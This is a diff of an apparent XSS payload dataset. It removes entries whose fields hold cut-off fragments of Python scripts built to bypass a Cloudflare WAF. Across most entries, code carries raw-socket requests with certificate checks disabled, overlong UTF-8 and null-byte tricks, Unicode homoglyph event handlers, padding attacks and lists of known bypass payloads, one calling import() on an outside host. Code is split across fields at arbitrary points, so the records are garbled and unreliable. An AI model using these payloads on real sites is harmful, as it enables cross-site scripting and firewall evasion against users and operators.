-      "payload": "\n--- G: Multipart Boundary Tricks ---\")\n\nfor p in CHUNK_PAYLOADS:\n    # XSS in boundary name\n    boundary = f\"--xss{urllib.parse.quote(p[:20])}end\"\n    safe_boundary = \"----XSSBound123\"\n    mbody = (\n        f\"--{safe_boundary}\r\n\"\n        f\"Content-Disposition: form-data; name=\\\"globalHtml\\\"\r\n\r\n{p}\r\n\"\n        f\"--{safe_boundary}--\r\n\"\n    ).encode('utf-8', errors='replace')\n    raw_req(\n        b\"POST / HTTP/1.1\r\nHost: \" + HOST.encode() + b\"\r\n\"\n        b\"Content-Type: multipart/form-data; boundary=\" + safe_boundary.encode() + b\"\r\n\"\n        b\"Content-Length: \" + str(len(mbody)).encode() + b\"\r\n\"\n        b\"Connection: close\r\n\r\n\" + mbody)\n    \n    # XSS in filename\n    mbody2 = (\n        f\"--{safe_boundary}\r\n\"\n        f\"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"{p}\\\"\r\n\"\n        f\"Content-Type: text/html\r\n\r\n{p}\r\n\"\n        f\"--{safe_boundary}--\r\n\"\n    ).encode('utf-8', errors='replace')\n    raw_req(\n        b\"POST / HTTP/1.1\r\nHost: \" + HOST.encode() + b\"\r\n\"\n        b\"Content-Type: multipart/form-data; boundary=\" + safe_boundary.encode() + b\"\r\n\"\n        b\"Content-Length: \" + str(len(mbody2)).encode() + b\"\r\n\"\n        b\"Connection: close\r\n\r\n\" + mbody2)\n\nprint(f\"  Multipart done: {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- H: Param Name as XSS Vector ---\")\n\nPARAM_NAMES = [\n    '<svg/onload=alert(1)>",
-      "description": "onerror=alert(1)',\n    '\"><svg/onload=alert(1)>', \"' onfocus=alert(1) '\",\n]\n\nfor pn in PARAM_NAMES:\n    enc = urllib.parse.quote(pn, safe='",
-      "technique": "direct_injection",
-      "source_file": "waf_round74_oss3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
       "id": "xss-0419",
       "category": "xss",
       "subcategory": "svg_based",
@@ -1586,40 +1348,12 @@
       "blocked": true
     },
     {
-      "id": "xss-0421",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "value=\"\"' in inp):\n                    print(f\"    INP: {inp[:150]}\")\n            return status, body\n        else:\n            print(f\"  {name:60s} BLOCK\")\n            return status, \"\"\n    except Exception as e:\n        print(f\"  {name:60s} ERROR: {e}\")\n        return 0, \"\"\n\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"18A: HTTP Method Variations\")\nprint(\"=\" * 75 + \"\n\")\n\npayload = \"<svg onload=alert(1)>\"\nfor method in [\"PUT",
-      "description": "PATCH\", \"DELETE\", \"OPTIONS\", \"HEAD",
-      "technique": "direct_injection",
-      "source_file": "waf_round18.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
       "id": "xss-0422",
       "category": "xss",
       "subcategory": "svg_based",
       "payload": "/')[-1][:20]}\"\n    test(name, data=\"globalHtml=%3Csvg+onload%3Dalert(1)%3E\", method=\"POST\",\n         headers={\"Content-Type\": ct})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"18B: DOM Clobbering (no JS execution, but page manipulation)\")\nprint(\"=\" * 75 + \"\n\")\n\n# DOM clobbering uses id/name attributes to override browser globals.\n# If the page JS uses certain variable names, we can hijack them.\n# This doesn't require event handlers or JS execution from us.\n\n# First, let's see what JS the page uses\nstatus, body = test(\"page-inspect\", {\"globalHtml\": \"test",
       "description": "attributeHtml\": \"test\"}, show=True)\nif body:\n    # Find all script tags and inline JS\n    scripts = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL)\n    print(f\"\\n  Found {len(scripts)} script blocks",
       "technique": "direct_injection",
-      "source_file": "waf_round18.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0423",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "\n\" + \"=\" * 75)\nprint(\"18C: Malformed UTF-8 Sequences\")\nprint(\"=\" * 75 + \"\n\")\n\n# Send raw bytes that are invalid UTF-8 — might confuse WAF parser\nimport socket\nimport ssl\n\ndef raw_get(name, path_bytes):\n    try:\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n        sock = socket.create_connection((\"waf.cumulusfire.net\", 443), timeout=TIMEOUT)\n        ssock = ctx.wrap_socket(sock, server_hostname=\"waf.cumulusfire.net\")\n\n        request = (\n            b\"GET \" + path_bytes + b\" HTTP/1.1\r\n\"\n            b\"Host: waf.cumulusfire.net\r\n\"\n            b\"Connection: close\r\n\"\n            b\"\r\n\"\n        )\n        ssock.sendall(request)\n        response = b\"\"\n        while True:\n            try:\n                d = ssock.recv(4096)\n                if not d: break\n                response += d\n            except: break\n        ssock.close()\n\n        resp_str = response.decode(\"utf-8\", errors=\"replace\")\n        status_m = re.search(r'HTTP/\\d\\.\\d (\\d+)', resp_str)\n        status = int(status_m.group(1)) if status_m else 0\n        blocked = status in (403, 406, 503)\n        print(f\"  {name:60s} HTTP {status}\")\n        return status\n    except Exception as e:\n        print(f\"  {name:60s} ERROR: {e}\")\n        return 0\n\n# Overlong UTF-8 encoding of < (0x3C)\n# 2-byte: C0 BC (invalid but some parsers accept)\n# 3-byte: E0 80 BC\nraw_get(\"overlong-2byte-lt\", b\"/?globalHtml=\\xc0\\xbc\\x73\\x76\\x67 onload=alert(1)\\xc0\\xbe\")\nraw_get(\"overlong-3byte-lt\", b\"/?globalHtml=\\xe0\\x80\\xbc\\x73\\x76\\x67 onload=alert(1)\\xe0\\x80\\xbe\")\n\n# Truncated UTF-8 sequences before event handler\nraw_get(\"trunc-utf8-before-on\", b\"/?globalHtml=%3Csvg%20\\xc0onload=alert(1)%3E\")\nraw_get(\"trunc-utf8-in-on\", b\"/?globalHtml=%3Csvg%20on\\xc0load=alert(1)%3E\")\n\n# BOM before payload\nraw_get(\"bom-before-payload\", b\"/?globalHtml=\\xef\\xbb\\xbf%3Csvg%20onload=alert(1)%3E\")\n\n# NULL byte injection\nraw_get(\"null-in-tag\", b\"/?globalHtml=%3Csvg%00onload=alert(1)%3E\")\nraw_get(\"null-before-on\", b\"/?globalHtml=%3Csvg%20%00onload=alert(1)%3E\")\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"18D: Application-Specific Testing\")\nprint(\"=\" * 75 + \"\n\")\n\n# Check what other parameters the app might accept\nother_params = {\n    \"param-id\": {\"id\": \"<svg onload=alert(1)>\"},\n    \"param-name\": {\"name\": \"<svg onload=alert(1)>\"},\n    \"param-q\": {\"q\": \"<svg onload=alert(1)>\"},\n    \"param-search\": {\"search\": \"<svg onload=alert(1)>\"},\n    \"param-query\": {\"query\": \"<svg onload=alert(1)>\"},\n    \"param-input\": {\"input\": \"<svg onload=alert(1)>\"},\n    \"param-html\": {\"html\": \"<svg onload=alert(1)>\"},\n    \"param-text\": {\"text\": \"<svg onload=alert(1)>\"},\n    \"param-data\": {\"data\": \"<svg onload=alert(1)>\"},\n    \"param-value\": {\"value\": \"<svg onload=alert(1)>\"},\n    \"param-content\": {\"content\": \"<svg onload=alert(1)>\"},\n    \"param-body\": {\"body\": \"<svg onload=alert(1)>\"},\n    \"param-msg\": {\"msg\": \"<svg onload=alert(1)>\"},\n    \"param-message\": {\"message\": \"<svg onload=alert(1)>\"},\n    \"param-url\": {\"url\": \"<svg onload=alert(1)>\"},\n    \"param-redirect\": {\"redirect\": \"<svg onload=alert(1)>\"},\n    \"param-callback\": {\"callback\": \"<svg onload=alert(1)>\"},\n    \"param-jsonp\": {\"jsonp\": \"<svg onload=alert(1)>\"},\n}\n\nfor name, params in other_params.items():\n    test(name, params, show=True)\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"18E: Request Line Manipulation\")\nprint(\"=\" * 75 + \"\n\")\n\n# Various path manipulations\npaths = {\n    \"path-double-q\": \"/?globalHtml=safe&globalHtml=<svg+onload=alert(1)>",
-      "description": "path-semicolon\": \"/;?globalHtml=<svg+onload=alert(1)>\",\n    \"path-hash-encode\": \"/%23?globalHtml=<svg+onload=alert(1)>\",\n    \"path-dot-dot\": \"/../?globalHtml=<svg+onload=alert(1)>\",\n    \"path-double-slash\": \"//?globalHtml=<svg+onload=alert(1)>\",\n    \"path-encoded-q\": \"/%3f globalHtml=<svg+onload=alert(1)>\",\n}\n\nfor name, path in paths.items():\n    raw_get(name, path.encode())\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"18F: IP/Host-Based Bypass Attempts",
-      "technique": "encoding",
       "source_file": "waf_round18.py",
       "tested_against": [
         "cloudflare_waf"
@@ -1726,20 +1460,6 @@
       "blocked": true
     },
     {
-      "id": "xss-0444",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "\n--- F: WAF Response Size Limit Abuse ---\")\n\n# F1: Large padding before payload (4KB, 8KB, 16KB, 32KB, 64KB)\nfor size_kb in [4, 8, 16, 32, 64, 128]:\n    padding = \"A\" * (size_kb * 1024)\n    body = f\"padding={padding}&globalHtml={urllib.parse.quote(XSS_SHORT)}\".encode()\n    if len(body) < 200000:  # Don't send >200KB\n        raw_req(\n            b\"POST / HTTP/1.1\r\nHost: \" + HOST.encode() + b\"\r\n\"\n            b\"Content-Type: application/x-www-form-urlencoded\r\n\"\n            b\"Content-Length: \" + str(len(body)).encode() + b\"\r\n\"\n            b\"Connection: close\r\n\r\n\" + body)\n\n# F2: Many parameters before payload\nparams = \"&\".join([f\"p{i}=safe\" for i in range(200)])\nbody_many = f\"{params}&globalHtml={urllib.parse.quote(XSS_SHORT)}\".encode()\nraw_req(\n    b\"POST / HTTP/1.1\r\nHost: \" + HOST.encode() + b\"\r\n\"\n    b\"Content-Type: application/x-www-form-urlencoded\r\n\"\n    b\"Content-Length: \" + str(len(body_many)).encode() + b\"\r\n\"\n    b\"Connection: close\r\n\r\n\" + body_many)\n\n# F3: Long URL with payload at the end\nlong_param = \"x\" * 4000\nenc_xss = urllib.parse.quote(XSS_SHORT)\nraw_req(f\"GET /?padding={long_param}&globalHtml={enc_xss} HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n\".encode())\n\nlong_param2 = \"x\" * 8000\nraw_req(f\"GET /?padding={long_param2}&globalHtml={enc_xss} HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n\".encode())\n\nprint(f\"  Size limit done: {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\n# G. BROWSER-SPECIFIC SEPARATOR CHARS (Masato Kinugawa)\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- G: Browser-Specific Separator Chars ---\")\n\n# Browser separator chars that may be treated as spaces\nSEPARATORS = [\n    0x09, 0x0B, 0x0C, 0x20, 0x3B,  # IE\n    0x28, 0x2C,  # Chrome\n    0x00, 0x0A, 0x0D,  # Common\n]\n\nfor sep in SEPARATORS:\n    sep_char = chr(sep) if sep > 0 else '\\x00'\n    payloads = [\n        f'<svg{sep_char}onload=alert(1)>',\n        f'<img{sep_char}src=x{sep_char}onerror=alert(1)>',\n        f'<a{sep_char}onmouseover=alert(1)>hover</a>',\n    ]\n    for p in payloads:\n        enc = urllib.parse.quote(p, safe='')\n        raw_req(f\"GET /?globalHtml={enc} HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n\".encode())\n\nprint(f\"  Separator chars done: {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\n# H. SSL/TLS CIPHER VARIATION\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- H: TLS Cipher Variation ---\")\n\nCIPHERS = [\n    'AES256-GCM-SHA384",
-      "description": "AES128-GCM-SHA256',\n    'ECDHE-RSA-AES256-GCM-SHA384',\n    'ECDHE-RSA-AES128-GCM-SHA256',\n    'ECDHE-ECDSA-AES256-GCM-SHA384',\n    'ECDHE-ECDSA-AES128-GCM-SHA256',\n    'DHE-RSA-AES256-GCM-SHA384',\n    'AES256-SHA256',\n    'AES128-SHA256',\n]\n\nenc_xss = urllib.parse.quote(XSS_SHORT, safe='",
-      "technique": "direct_injection",
-      "source_file": "waf_round81_waffled.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
       "id": "xss-0445",
       "category": "xss",
       "subcategory": "svg_based",
@@ -1815,20 +1535,6 @@
       "subcategory": "svg_based",
       "payload": "\n\" + \"=\" * 80)\nprint(\"48A: Verify Normalization — Does Server Convert Fullwidth to ASCII?\")\nprint(\"=\" * 80 + \"\n\")\n\n# Send harmless fullwidth text, check if it's normalized in response\nt(\"fw-harmless-ABC\", {\"globalHtml\": \"ＡＢＣ\"})\nt(\"fw-harmless-abc\", {\"globalHtml\": \"ａｂｃ\"})\nt(\"fw-harmless-123\", {\"globalHtml\": \"１２３\"})\nt(\"fw-harmless-lt\", {\"globalHtml\": \"＜\"})  # fullwidth <\nt(\"fw-harmless-gt\", {\"globalHtml\": \"＞\"})  # fullwidth >\nt(\"fw-harmless-hello\", {\"globalHtml\": \"ｈｅｌｌｏ\"})\nt(\"fw-harmless-test\", {\"globalHtml\": \"ｔｅｓｔ\"})\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 80)\nprint(\"48B: Unicode Confusables / Homoglyphs for Latin Letters\")\nprint(\"=\" * 80 + \"\n\")\n\n# Characters from other scripts that look like Latin letters\n# These might bypass regex but be rendered as Latin by browsers\nhomoglyphs = {\n    # Cyrillic homoglyphs (look identical to Latin)\n    'a': '\\u0430',  # а (Cyrillic)\n    'c': '\\u0441',  # с (Cyrillic)\n    'e': '\\u0435',  # е (Cyrillic)\n    'o': '\\u043e',  # о (Cyrillic)\n    'p': '\\u0440',  # р (Cyrillic)\n    's': '\\u0455',  # ѕ (Cyrillic)\n    'i': '\\u0456',  # і (Cyrillic)\n    'x': '\\u0445',  # х (Cyrillic)\n    \n    # Greek homoglyphs\n    'A': '\\u0391',  # Α (Greek Alpha)\n    'B': '\\u0392',  # Β (Greek Beta)\n    'E': '\\u0395',  # Ε (Greek Epsilon)\n    'H': '\\u0397',  # Η (Greek Eta)\n    'I': '\\u0399',  # Ι (Greek Iota)\n    'K': '\\u039a',  # Κ (Greek Kappa)\n    'M': '\\u039c',  # Μ (Greek Mu)\n    'N': '\\u039d',  # Ν (Greek Nu)\n    'O': '\\u039f',  # Ο (Greek Omicron)\n    'P': '\\u03a1',  # Ρ (Greek Rho)\n    'T': '\\u03a4',  # Τ (Greek Tau)\n    'X': '\\u03a7',  # Χ (Greek Chi)\n}\n\n# Build \"onload\" with Cyrillic homoglyphs\ncyrillic_on = '\\u043e\\u043d'  # \"он\" = Cyrillic o+n\ncyrillic_onload = f'{cyrillic_on}l\\u043e\\u0430d'  # онloаd\nprint(f\"  Cyrillic 'onload': {cyrillic_onload} (NFKC: {unicodedata.normalize('NFKC', cyrillic_onload)})\")\n\nhomo_payloads = {\n    # Cyrillic 'on' prefix\n    \"cyrillic-on-load\": f'<svg/{cyrillic_on}load=alert(1)>",
       "description": "cyrillic-onload\": f'<svg/{cyrillic_onload}=alert(1)>',\n    \n    # Cyrillic 'o' in onerror\n    \"cyrillic-o-nerror\": f'<img src=x \\u043enerror=alert(1)>',\n    \n    # Cyrillic 'a' in alert\n    \"cyrillic-a-lert\": f'<svg/onload=\\u0430lert(1)>',\n    \n    # Cyrillic 's' in script\n    \"cyrillic-s-cript\": f'<\\u0455cript>alert(1)</\\u0455cript>',\n    \n    # Full Cyrillic event name\n    \"cyrillic-full-on\": f'\" {cyrillic_on}focus=alert(1) autofocus x=\"',\n    \n    # Greek homoglyphs\n    \"greek-SVG\": f'<\\u03a3VG/onload=alert(1)>',  # ΣVG\n    \"greek-IMG\": f'<\\u0399MG src=x onerror=alert(1)>',  # ΙMG\n    \n    # Mix Cyrillic and Latin\n    \"mix-svg-cyrillic\": f'<\\u0455vg/\\u043enload=alert(1)>',  # ѕvg/оnload\n    \"mix-img-cyrillic\": f'<img \\u0455rc=x \\u043enerror=alert(1)>',\n    \n    # Armenian homoglyphs\n    \"armenian-o\": f'<svg/\\u0585nload=alert(1)>',  # օnload (Armenian o)\n    \n    # Attr breakout with Cyrillic\n    \"attr-cyrillic-on\": f'\" {cyrillic_on}focus=alert(1) autofocus x=\"',\n    \"attr-cyrillic-onfocus\": f'\" \\u043enfocus=alert(1) autofocus x=\"',\n}\n\nfor name, payload in homo_payloads.items():\n    if 'x=\"' in payload:\n        t(name, {\"attributeHtml\": payload})\n    else:\n        t(name, {\"globalHtml\": payload})\n    # Also POST\n    if 'x=\"' in payload:\n        t(f\"POST-{name}\", {\"attributeHtml\": payload}, method=\"POST",
-      "technique": "direct_injection",
-      "source_file": "waf_round48_52.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0463",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "\n\" + \"=\" * 80)\nprint(\"49A: Mathematical Alphanumeric Symbols\")\nprint(\"=\" * 80 + \"\n\")\n\n# Unicode Math Symbols: 𝐨𝐧𝐥𝐨𝐚𝐝 (bold), 𝑜𝑛𝑙𝑜𝑎𝑑 (italic), etc.\n# These NFKC-normalize to ASCII! WAF might not catch them.\n\n# Bold: U+1D400-1D433 (A-Z), U+1D41A-1D433 (a-z)\ndef to_math_bold(s):\n    r = ''\n    for c in s:\n        if 'a' <= c <= 'z':\n            r += chr(0x1d41a + ord(c) - ord('a'))\n        elif 'A' <= c <= 'Z':\n            r += chr(0x1d400 + ord(c) - ord('A'))\n        else:\n            r += c\n    return r\n\n# Italic: U+1D434-1D467\ndef to_math_italic(s):\n    r = ''\n    for c in s:\n        if 'a' <= c <= 'z':\n            # italic has a gap at 'h' (U+210E)\n            if c == 'h':\n                r += '\\u210e'\n            else:\n                r += chr(0x1d44e + ord(c) - ord('a'))\n        elif 'A' <= c <= 'Z':\n            r += chr(0x1d434 + ord(c) - ord('A'))\n        else:\n            r += c\n    return r\n\n# Script (calligraphic): U+1D49C-1D4CF\ndef to_math_script(s):\n    r = ''\n    for c in s:\n        if 'a' <= c <= 'z':\n            r += chr(0x1d4b6 + ord(c) - ord('a'))\n        elif 'A' <= c <= 'Z':\n            r += chr(0x1d49c + ord(c) - ord('A'))\n        else:\n            r += c\n    return r\n\n# Monospace: U+1D670-1D6A3\ndef to_math_mono(s):\n    r = ''\n    for c in s:\n        if 'a' <= c <= 'z':\n            r += chr(0x1d68a + ord(c) - ord('a'))\n        elif 'A' <= c <= 'Z':\n            r += chr(0x1d670 + ord(c) - ord('A'))\n        else:\n            r += c\n    return r\n\nprint(f\"  Bold 'onload': {to_math_bold('onload')} → NFKC: {unicodedata.normalize('NFKC', to_math_bold('onload'))}\")\nprint(f\"  Italic 'onload': {to_math_italic('onload')} → NFKC: {unicodedata.normalize('NFKC', to_math_italic('onload'))}\")\nprint(f\"  Mono 'onload': {to_math_mono('onload')} → NFKC: {unicodedata.normalize('NFKC', to_math_mono('onload'))}\")\nprint()\n\nmath_payloads = {\n    # Bold event names\n    \"bold-onload\": f'<svg/{to_math_bold(\"onload\")}=alert(1)>",
-      "description": "bold-onerror\": f'<img src=x {to_math_bold(\"onerror",
       "technique": "direct_injection",
       "source_file": "waf_round48_52.py",
       "tested_against": [
@@ -2034,20 +1740,6 @@
       "blocked": true
     },
     {
-      "id": "xss-0483",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "\n\" + \"=\" * 80)\nprint(\"53A: Enclosed Alphanumerics (Ⓐ-Ⓩ, ⓐ-ⓩ, ①-⑳)\")\nprint(\"=\" * 80 + \"\n\")\n\n# Enclosed letters: Ⓐ=U+24B6, ⓐ=U+24D0\n# These NFKC-normalize to letters!\ndef to_enclosed(s):\n    r = ''\n    for c in s:\n        if 'a' <= c <= 'z':\n            r += chr(0x24d0 + ord(c) - ord('a'))\n        elif 'A' <= c <= 'Z':\n            r += chr(0x24b6 + ord(c) - ord('A'))\n        else:\n            r += c\n    return r\n\nenc_onload = to_enclosed('onload')\nprint(f\"  Enclosed 'onload': {enc_onload} → NFKC: {unicodedata.normalize('NFKC', enc_onload)}\")\n\nenclosed_payloads = {\n    \"enc-onload\": f'<svg/{enc_onload}=alert(1)>",
-      "description": "enc-onerror\": f'<img src=x {to_enclosed(\"onerror",
-      "technique": "direct_injection",
-      "source_file": "waf_round53_56.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
       "id": "xss-0484",
       "category": "xss",
       "subcategory": "svg_based",
@@ -2076,20 +1768,6 @@
       "blocked": true
     },
     {
-      "id": "xss-0489",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "=\" * 80 + \"\n\")\n\n# Latin Extended chars that look like ASCII:\n# ɑ (U+0251) looks like 'a', ɡ (U+0261) looks like 'g'\n# ı (U+0131) dotless i, ȷ (U+0237) dotless j\n# ɴ (U+0274) small capital N, ᴏ (U+1D0F) small capital O\n\nipa_payloads = {\n    # IPA/Latin Extended versions of event handler chars\n    \"ipa-on-0251\": f'<svg/\\u0251nload=alert(1)>',  # ɑnload\n    \"ipa-on-1d0f\": f'<svg/\\u1d0fnload=alert(1)>',  # ᴏnload\n    \"ipa-img-0251\": f'<img src=x \\u0251nerror=alert(1)>',\n    \n    # Small capitals\n    \"smcap-svg\": f'<svg/\\u1d0f\\u0274load=alert(1)>',  # ᴏɴload\n    \n    # Latin letter turned/reversed\n    \"turned-a\": f'<svg/\\u0250nload=alert(1)>',  # ɐnload\n    \"turned-e\": f'<svg/on\\u01ddrror=alert(1)>',  # onǝrror (won't match)\n    \n    # Modifier letters that NFKC normalize\n    \"mod-h\": f'<svg/onload=alert\\u02b0(1)>',  # alert + superscript h\n    \"mod-n\": f'<svg/o\\u207fload=alert(1)>',    # o + superscript n + load\n}\n\nfor name, payload in ipa_payloads.items():\n    t(name, {\"globalHtml\": payload})\n    time.sleep(0.1)\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 80)\nprint(\"55A: CJK + Double Encoding + Charset Mismatch\")\nprint(\"=\" * 80 + \"\n\")\n\n# Send body with CJK charset but ASCII XSS payload\n# WAF might decode with wrong charset and miss the XSS\n\ndef raw_post(name, headers_bytes, body_bytes):\n    try:\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n        sock = socket.create_connection((\"waf.cumulusfire.net\", 443), timeout=TIMEOUT)\n        ssock = ctx.wrap_socket(sock, server_hostname=\"waf.cumulusfire.net\")\n        ssock.sendall(headers_bytes + body_bytes)\n        response = b\"\"\n        while True:\n            try:\n                ssock.settimeout(10)\n                d = ssock.recv(8192)\n                if not d: break\n                response += d\n            except: break\n        ssock.close()\n        resp_str = response.decode(\"utf-8\", errors=\"replace\")\n        status_m = re.search(r'HTTP/[\\d.]+ (\\d+)', resp_str)\n        status = int(status_m.group(1)) if status_m else 0\n        blocked = status in (403, 406, 503)\n        has_xss = any(k in resp_str for k in ['onload=",
-      "description": "onerror=', 'alert(",
-      "technique": "direct_injection",
-      "source_file": "waf_round53_56.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
       "id": "xss-0490",
       "category": "xss",
       "subcategory": "svg_based",
@@ -2097,34 +1775,6 @@
       "description": "NFD', 'NFKC', 'NFKD",
       "technique": "direct_injection",
       "source_file": "waf_round53_56.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0493",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "\n\" + \"=\" * 70)\nprint(\"SECTION 1: Known CF WAF Bypasses from Researchers\")\nprint(\"=\" * 70 + \"\n\")\n\nknown_html = {\n    # BruteLogic bypass\n    \"brutelogic-svg-only\": '<Svg Only=1 OnLoad=confirm(1)>',\n    # Troll_13 bypass\n    \"troll13-svg-oni\": '<svg/oni=on onload=confirm(2)>',\n    # aufzayed bypass\n    \"aufzayed-svg-on-space\": '<svg/on onload=alert(1)>',\n    # svg with dummy attribute before real one\n    \"svg-on-onload\": '<svg on onload=(alert)(document.domain)>',\n    # Optional chaining\n    \"svg-optional-chain\": '<svg onx=() onload=window.alert?.()>',\n    # Ignored attribute\n    \"img-ignored-src\": '<img ignored=() src=x onerror=prompt(1)>',\n    # svg with dummy onx\n    \"svg-onx-confirm\": '<svg onx=() onload=(confirm)(1)>',\n    # ex_mi payload\n    \"exmi-template\": '<img/src=x onError=\"`${x}`;alert(`1`);\">',\n    # Click-based\n    \"a-onclick-confirm\": '<a\"/onclick=(confirm)()>Click Here!',\n    # Decimal entity encoding for parentheses\n    \"svg-dec-entity\": '<svg onload=prompt%26%230000000040document.domain)>',\n    # Hex entity encoding\n    \"svg-hex-entity\": '<svg onload=prompt%26%23x000000028;document.domain)>',\n    # Tab and newline in javascript:\n    \"a-tab-js\": '<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\">X</a>',\n    # URL-encoded payload in comment\n    \"comment-encoded\": '<--%253cimg%20onerror=alert(1)%20src=a%253e --!>',\n    # href with mixed entities\n    \"a-href-mixed\": \"<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>\",\n    # Pipe operator\n    \"img-pipe\": \"1'\\\"><img/src/onerror=.1|alert``>\",\n    # Import external\n    \"img-import\": \"<img src=x onError=import('//1152848220/')>\",\n    # Percent encoding bypass\n    \"percent-script\": '%2sscript%2ualert()%2s/script%2u',\n    # Pointer enter with null byte\n    \"onpointerenter-null\": '\"onx+%00+onpointerenter%3dalert(domain)+x\"',\n    # SVG with entity-encoded parens\n    \"svg-entity-parens\": '\"><svg%20onload=alert%26%230000000040\"1\")>',\n    # Find method\n    \"find-alert\": \"%27%09);%0d%0a%09%09[1].find(alert)//\",\n    # Mouseleave with print\n    \"img-mouseleave\": '\"><img src=1 onmouseleave=print()>',\n    # Custom tag with ondrag\n    \"custom-ondrag\": '<o oni=on ondrag=alert(1)>Drag Me',\n    # SVG without closing with //\n    \"svg-no-close\": '<svg oni=on onload=alert(1)//',\n}\n\nfor name, payload in known_html.items():\n    b, r, p = test(name, \"globalHtml\", payload)\n    if r: bypasses.append((\"HTML\", name, payload))\n    elif p: partials.append((\"HTML\", name, payload))\n\n# ════════════════════════════════════════════════════════════════════════════\n# SECTION 2: Known attribute context bypasses\n# ════════════════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 70)\nprint(\"SECTION 2: Attribute Context Known Bypasses\")\nprint(\"=\" * 70 + \"\n\")\n\nknown_attr = {\n    # Xib3rR4dAr attribute bypass\n    \"xib3r-attr-onfocus\": 'bbbbb\" id=\"bbbbb\" Only=1 tabindex=1 onfocus=alert(1) a',\n    # SVG breakout\n    \"attr-svg-oni\": '\"><svg/oni=on onload=confirm(2)>",
-      "description": "attr-svg-oni-single\": \"'><svg/oni=on onload=confirm(2)>\",\n    # POST-specific bypass\n    \"attr-onclick-post\": 'cccc\" oni=on onclick=print() dddd',\n    # BruteLogic variations\n    \"attr-brutelogic1\": \"'-eval(\\\"window['pro'+'mpt",
-      "technique": "direct_injection",
-      "source_file": "waf_round4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0494",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "ATTR-POST\", name, payload))\n    elif p: partials.append((\"ATTR-POST\", name, payload))\n\n# ════════════════════════════════════════════════════════════════════════════\n# SECTION 3: Mutation-based and encoding variations of known bypasses\n# ════════════════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 70)\nprint(\"SECTION 3: Mutations of Known Bypasses\")\nprint(\"=\" * 70 + \"\n\")\n\nmutations = {\n    # Case variations of known working payloads\n    \"svg-only-lower\": '<svg only=1 onload=confirm(1)>",
-      "description": "svg-ONLY-upper\": '<SVG ONLY=1 ONLOAD=confirm(1)>',\n    \"svg-mixed-Only\": '<sVg Only=1 oNlOaD=confirm(1)>',\n\n    # Spacing variations\n    \"svg-double-space-on\": '<svg  on  onload=alert(1)>',\n    \"svg-tab-on\": '<svg\\ton\\tonload=alert(1)>',\n    \"svg-cr-on\": '<svg\\ron\\ronload=alert(1)>',\n    \"svg-lf-on\": '<svg\\non\\nonload=alert(1)>',\n\n    # Different functions\n    \"svg-oni-print\": '<svg/oni=on onload=print()>',\n    \"svg-oni-eval\": '<svg/oni=on onload=eval(\"ale\"+\"rt(1)",
-      "technique": "direct_injection",
-      "source_file": "waf_round4.py",
       "tested_against": [
         "cloudflare_waf"
       ],
@@ -2146,20 +1796,6 @@
       "blocked": true
     },
     {
-      "id": "xss-0497",
-      "category": "xss",
-      "subcategory": "svg_based",
